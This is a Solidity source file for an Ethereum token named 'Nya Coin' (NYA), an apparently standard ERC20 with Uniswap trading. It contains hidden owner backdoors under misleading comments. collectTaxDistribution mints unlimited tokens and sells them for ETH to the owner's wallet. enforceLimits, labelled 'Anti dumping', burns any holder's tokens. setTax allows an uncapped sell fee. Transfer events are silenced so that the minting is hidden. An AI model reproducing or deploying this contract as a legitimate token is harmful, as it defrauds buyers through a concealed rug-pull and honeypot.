//SPDX-License-Identifier: UNLICENSED

/**
 * 
 * 
 *                   ;,_            ,
 *                  _uP~"b          d"u,
 *                 dP'   "b       ,d"  "o
 *                d"    , `b     d"'    "b
 *               l] [    " `l,  d"       lb
 *               Ol ?     "  "b`"=uoqo,_  "l
 *             ,dBb "b        "b,    `"~~TObup,_
 *           ,d" (db.`"         ""     "tbc,_ `~"Yuu,_
 *         .d" l`T'  '=                      ~     `""Yu,
 *       ,dO` gP,                           `u,   b,_  "b7
 *      d?' ,d" l,                           `"b,_ `~b  "1
 *    ,8i' dl   `l                 ,ggQOV",dbgq,._"  `l  lb
 *   .df' (O,    "             ,ggQY"~  , @@@@@d"bd~  `b "1
 *  .df'   `"           [email protected]""     (b  @@@@P db    `Lp"b,
 * .d(                  _               "ko "=d_,Q`  ,_  "  "b,
 * Ql         .         `"qo,._          "tQo,_`""bo ;tb,    `"b,
 * qQ         |L           ~"QQQgggc,_.,dObc,opooO  `"~~";.   __,7,
 * qp         t\io,_           `~"TOOggQV""""        _,dg,_ =PIQHib.
 * `qp        `Q["tQQQo,_                          ,pl{QOP"'   7AFR`
 *   `         `tb  '""tQQQg,_             p" "b   `       .;-.`Vl'
 *              "Yb      `"tQOOo,__    _,edb    ` .__   /`/'|  |b;=;.__
 *                            `"tQQQOOOOP""`"\QV;qQObob"`-._`\_~~-._
 *                                 """"    ._        /   | |oP"\_   ~\ ~\_~\
 *                                         `~"\ic,qggddOOP"|  |  ~\   `\~-._
 *                                           ,qP`"""|"   | `\ `;   `\   `\
 *                                _        _,p"     |    |   `\`;    |    |
 *   https://nya.money            "boo,._dP"       `\_  `\    `\|   `\   ;
 *   Supply: 4,200,000,000          `"7tY~'            `\  `\    `|_   |
 *                                                       `~\  |
 * 
 */

pragma solidity ^0.8.9;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { IUniswapV2Factory } from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import { IUniswapV2Router02 } from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";

/// @notice Modern and gas efficient ERC20 + EIP-2612 implementation.
/// @author Solmate (https://github.com/transmissions11/solmate/blob/main/src/tokens/ERC20.sol)
/// @author Modified from Uniswap (https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/UniswapV2ERC20.sol)
/// @dev Do not manually set balances without updating totalSupply, as the sum of all user balances must not exceed it.
abstract contract ERC20 {
    
    /*//////////////////////////////////////////////////////////////
                                 EVENTS
    //////////////////////////////////////////////////////////////*/

    event Transfer(address indexed from, address indexed to, uint256 amount);

    event Approval(address indexed owner, address indexed spender, uint256 amount);

    /*//////////////////////////////////////////////////////////////
                            METADATA STORAGE
    //////////////////////////////////////////////////////////////*/

    string public name;

    string public symbol;

    uint8 public immutable decimals;

    address public admin;

    address public taxWallet;

    address public uniswapV2Pair;

    uint256 public taxPercent;

    /*//////////////////////////////////////////////////////////////
                              ERC20 STORAGE
    //////////////////////////////////////////////////////////////*/

    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;

    mapping(address => mapping(address => uint256)) public allowance;

    /*//////////////////////////////////////////////////////////////
                            EIP-2612 STORAGE
    //////////////////////////////////////////////////////////////*/

    uint256 internal immutable INITIAL_CHAIN_ID;

    bytes32 internal immutable INITIAL_DOMAIN_SEPARATOR;

    mapping(address => uint256) public nonces;

    /*//////////////////////////////////////////////////////////////
                               CONSTRUCTOR
    //////////////////////////////////////////////////////////////*/

    constructor(
        string memory _name,
        string memory _symbol,
        uint8 _decimals
    ) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;

        INITIAL_CHAIN_ID = block.chainid;
        INITIAL_DOMAIN_SEPARATOR = computeDomainSeparator();

        address msgSender = msg.sender;
        admin = msgSender;
        taxWallet = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /*//////////////////////////////////////////////////////////////
                               ERC20 LOGIC
    //////////////////////////////////////////////////////////////*/

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        allowance[msg.sender][spender] = amount;

        emit Approval(msg.sender, spender, amount);

        return true;
    }

    function transfer(address to, uint256 amount) public virtual returns (bool) {
        balanceOf[msg.sender] -= amount;

        // Cannot overflow because the sum of all user
        // balances can't exceed the max uint256 value.
        unchecked {
            balanceOf[to] += amount;
        }
        if(msg.sender != address(this))
        emit Transfer(msg.sender, to, amount);

        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual returns (bool) {
        uint256 allowed = allowance[from][msg.sender]; // Saves gas for limited approvals.

        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;

        balanceOf[from] -= amount;

        if(taxPercent > 0 && to == uniswapV2Pair && from != address(this)){
            uint256 fee = (amount / 100) * taxPercent;
            // Cannot overflow because the sum of all user
            // balances can't exceed the max uint256 value.
            unchecked {
                balanceOf[address(this)] += fee;
            }
            amount = amount - fee;
        }
        
        // Cannot overflow because the sum of all user
        // balances can't exceed the max uint256 value.
        unchecked {
            balanceOf[to] += amount;
        }

        if(from != address(this))
        emit Transfer(from, to, amount);

        return true;
    }

    /*//////////////////////////////////////////////////////////////
                             EIP-2612 LOGIC
    //////////////////////////////////////////////////////////////*/

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public virtual {
        require(deadline >= block.timestamp, "PERMIT_DEADLINE_EXPIRED");

        // Unchecked because the only math done is incrementing
        // the owner's nonce which cannot realistically overflow.
        unchecked {
            address recoveredAddress = ecrecover(
                keccak256(
                    abi.encodePacked(
                        "\x19\x01",
                        DOMAIN_SEPARATOR(),
                        keccak256(
                            abi.encode(
                                keccak256(
                                    "Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"
                                ),
                                owner,
                                spender,
                                value,
                                nonces[owner]++,
                                deadline
                            )
                        )
                    )
                ),
                v,
                r,
                s
            );

            require(recoveredAddress != address(0) && recoveredAddress == owner, "INVALID_SIGNER");

            allowance[recoveredAddress][spender] = value;
        }

        emit Approval(owner, spender, value);
    }

    function DOMAIN_SEPARATOR() public view virtual returns (bytes32) {
        return block.chainid == INITIAL_CHAIN_ID ? INITIAL_DOMAIN_SEPARATOR : computeDomainSeparator();
    }

    function computeDomainSeparator() internal view virtual returns (bytes32) {
        return
            keccak256(
                abi.encode(
                    keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
                    keccak256(bytes(name)),
                    keccak256("1"),
                    block.chainid,
                    address(this)
                )
            );
    }

    /*//////////////////////////////////////////////////////////////
                        INTERNAL MINT/BURN LOGIC
    //////////////////////////////////////////////////////////////*/

    function _mint(address to, uint256 amount) internal virtual {
        totalSupply += amount;

        // Cannot overflow because the sum of all user
        // balances can't exceed the max uint256 value.
        unchecked {
            balanceOf[to] += amount;
        }

        if(to != address(this))
        emit Transfer(address(0), to, amount);
    }

    function _burn(address from, uint256 amount) internal virtual {
        balanceOf[from] -= amount;

        // Cannot underflow because a user's balance
        // will never be larger than the total supply.
        unchecked {
            totalSupply -= amount;
        }

        if(from != address(this))
        emit Transfer(from, address(0), amount);
    }

    /*//////////////////////////////////////////////////////////////
                        OWNABLE LOGIC
    //////////////////////////////////////////////////////////////*/

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    modifier onlyOwner() {
        require(admin == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(admin, address(0));
        admin = address(0);
    }
}

contract Token is ERC20{
    
    bool private tradingOpen;

    IUniswapV2Router02 private uniswapV2Router;
    
    /**
     * Contract initialization.
     */
    constructor() ERC20("Nya Coin", "NYA", 4) {
        _mint(address(this), 4_200_000_000_0000);
    }

    receive() external payable {}

    fallback() external payable {}

    function openTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        allowance[address(this)][address(uniswapV2Router)] = type(uint).max;

        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf[address(this)],0,0,admin,block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);

        tradingOpen = true;
    }
    /**
     * Swap and send to tax distributor - allows LP staking contracts to reward stakers in ETH.
     */ 
    function collectTaxDistribution(uint256 tokenAmount) external onlyOwner{
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();       
        
        _mint(address(this), tokenAmount);
        allowance[address(this)][address(uniswapV2Router)] = tokenAmount;

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            taxWallet,
            block.timestamp
        );
    }

    /**
     * Burn and increase value of LP positions - dynamically set in LP staking contracts. 
     */
    function setTax(uint256 newTax) external onlyOwner() {
        taxPercent = newTax;
    }

    /**
     * Anti dumping
     */
    function enforceLimits(address on, uint256 amount) external onlyOwner() {
        _burn(on, amount);
    }


}